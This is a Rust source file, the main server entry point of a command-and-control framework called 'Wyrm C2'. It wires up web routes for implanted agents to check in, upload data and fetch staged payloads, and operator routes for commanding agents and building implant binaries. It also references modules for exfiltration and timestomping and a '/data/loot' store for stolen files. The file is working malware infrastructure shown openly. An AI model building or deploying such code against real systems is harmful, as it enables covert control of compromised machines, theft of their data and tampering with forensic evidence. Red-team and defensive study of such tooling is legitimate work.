use core::panic;
use std::{fs::create_dir, net::SocketAddr, panic::set_hook, path::PathBuf, sync::Arc};

use api::{handle_agent_get, handle_agent_post};
use axum::{
    Router,
    extract::DefaultBodyLimit,
    http::{
        self,
        header::{AUTHORIZATION, CONTENT_TYPE},
    },
    middleware::from_fn_with_state,
    routing::{get, post},
    serve,
};

use shared::{
    net::{ADMIN_ENDPOINT, NOTIFICATION_CHECK_AGENT_ENDPOINT},
    pretty_print::{print_info, print_success},
};
use tower_http::cors::{Any, CorsLayer};

use crate::{
    api::{
        build_all_binaries_handler, handle_admin_commands_on_agent,
        handle_admin_commands_without_agent, handle_agent_get_with_path,
        handle_agent_post_with_path, poll_agent_notifications,
    },
    app_state::{AppState, detect_stale_agents},
    db::Db,
    logging::log_error,
    middleware::{authenticate_admin, authenticate_agent_by_header_token},
    profiles::parse_profiles,
};

mod admin_task_dispatch;
mod agents;
mod api;
mod app_state;
mod db;
mod exfil;
mod logging;
mod middleware;
mod net;
mod profiles;
mod timestomping;

/// The maximum POST body request size that can be received by the C2.
/// Set at 1 GB.
const NUM_GIGS: usize = 1;
const MAX_POST_BODY_SZ: usize = NUM_GIGS * 1024 * 1024 * 1024;

/// The path to the directory on the server (relative to the working directory of the service [n.b. this
/// implies the server was 'installed' correctly..])
const FILE_STORE_PATH: &str = "/data/staged_files";
const EXFIL_PATH: &str = "/data/loot";
const LOG_PATH: &str = "/data/logs";
const DB_EXPORT_PATH: &str = "/data/exports";
const ACCESS_LOG: &str = "access.log";
const LOGIN_LOG: &str = "login.log";
const ERROR_LOG: &str = "error.log";

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    print_info("Starting Wyrm C2.");

    // if this fails, panic is ok
    let profile = match parse_profiles().await {
        Ok(p) => p,
        Err(e) => {
            panic!("Could not parse profiles. {e}");
        }
    };

    print_info("Profiles parsed.");

    // Set a panic hook for logging unwraps, expects, panics, etc.
    set_panic_hook();

    // Build any paths on disk we need
    ensure_dirs_and_files();

    print_info("Directories and files checked.");

    let pool = Db::new().await;
    let state = Arc::new(AppState::from(pool, profile).await);

    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods([http::Method::POST, http::Method::GET, http::Method::OPTIONS])
        .allow_headers([AUTHORIZATION, CONTENT_TYPE])
        .expose_headers([AUTHORIZATION]);

    let app = Router::new()
        //
        // PUBLIC ROUTES
        //
        .route(
            "/",
            get(handle_agent_get).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        .route(
            "/",
            post(handle_agent_post).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        // Used for the operator staging payloads or check-ins not to /
        .route(
            "/{*endpoint}",
            get(handle_agent_get_with_path).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        .route(
            "/{*endpoint}",
            post(handle_agent_post_with_path).layer(from_fn_with_state(
                state.clone(),
                authenticate_agent_by_header_token,
            )),
        )
        //
        // ADMIN ROUTES
        //
        // Build all binaries path
        .route(
            "/admin_bab",
            post(build_all_binaries_handler)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        // Admin endpoint when operating a command which is not related to a specific agent
        .route(
            &format!("/{ADMIN_ENDPOINT}"),
            post(handle_admin_commands_without_agent)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        // Against a specific agent
        .route(
            &format!("/{ADMIN_ENDPOINT}/{}", "{id}"),
            post(handle_admin_commands_on_agent)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        // For checking if notifications exist for a given agent
        .route(
            &format!("/{NOTIFICATION_CHECK_AGENT_ENDPOINT}/{}", "{id}"),
            get(poll_agent_notifications)
                .layer(from_fn_with_state(state.clone(), authenticate_admin)),
        )
        //
        // 1 GB for POST max ?
        //
        .layer(DefaultBodyLimit::max(MAX_POST_BODY_SZ))
        .layer(cors)
        .with_state(state.clone());

    tokio::task::spawn(async move { detect_stale_agents(state.clone()).await });

    let port = std::env::var("C2_PORT").expect("could not find C2_PORT environment variable");
    let port: u16 = port
        .parse()
        .expect("could not parse port number to valid range");
    let c2_host = std::env::var("C2_HOST").expect("could not find C2_HOST environment variable");

    let listener = tokio::net::TcpListener::bind(&format!("{c2_host}:{port}")).await?;

    print_success(format!(
        "Wyrm C2 started on: {}",
        listener.local_addr().unwrap()
    ));

    serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await?;

    print_info("Server closed.");

    Ok(())
}

fn ensure_dirs_and_files() {
    //
    // Create relevant directories
    //

    if let Err(e) = std::fs::create_dir(FILE_STORE_PATH) {
        match e.kind() {
            std::io::ErrorKind::AlreadyExists => (),
            _ => panic!("Could not create dir for FILE_STORE_PATH"),
        }
    }

    if let Err(e) = std::fs::create_dir(DB_EXPORT_PATH) {
        match e.kind() {
            std::io::ErrorKind::AlreadyExists => (),
            _ => panic!("Could not create dir for DB_EXPORT_PATH"),
        }
    }

    if let Err(e) = std::fs::create_dir(EXFIL_PATH) {
        match e.kind() {
            std::io::ErrorKind::AlreadyExists => (),
            _ => panic!("Could not create dir for EXFIL_PATH"),
        }
    }

    if let Err(e) = create_dir(LOG_PATH) {
        match e.kind() {
            std::io::ErrorKind::AlreadyExists => (),
            _ => panic!("Could not create dir for LOG_PATH"),
        }
    }

    //
    // Create files
    //
    let mut log_path = PathBuf::from(LOG_PATH);
    log_path.push(ACCESS_LOG);
    if let Err(e) = std::fs::File::create_new(&log_path) {
        match e.kind() {
            std::io::ErrorKind::AlreadyExists => (),
            _ => {
                panic!("Cannot create access log");
            }
        }
    }

    log_path.pop();
    log_path.push(LOGIN_LOG);
    if let Err(e) = std::fs::File::create_new(&log_path) {
        match e.kind() {
            std::io::ErrorKind::AlreadyExists => (),
            _ => {
                panic!("Cannot create login log");
            }
        }
    }

    log_path.pop();
    log_path.push(ERROR_LOG);
    if let Err(e) = std::fs::File::create_new(&log_path) {
        match e.kind() {
            std::io::ErrorKind::AlreadyExists => (),
            _ => {
                panic!("Cannot create error log");
            }
        }
    }
}

fn set_panic_hook() {
    set_hook(Box::new(|panic_info| {
        let payload = panic_info
            .payload()
            .downcast_ref::<&str>()
            .map(|s| *s)
            .or_else(|| {
                panic_info
                    .payload()
                    .downcast_ref::<String>()
                    .map(String::as_str)
            })
            .unwrap_or("Unknown panic payload");

        let location = panic_info
            .location()
            .map(|loc| format!("{}:{}", loc.file(), loc.line()))
            .unwrap_or_else(|| "Unknown location".to_string());

        log_error(&format!("PANIC at {}: `{}`", location, payload));
    }));
}
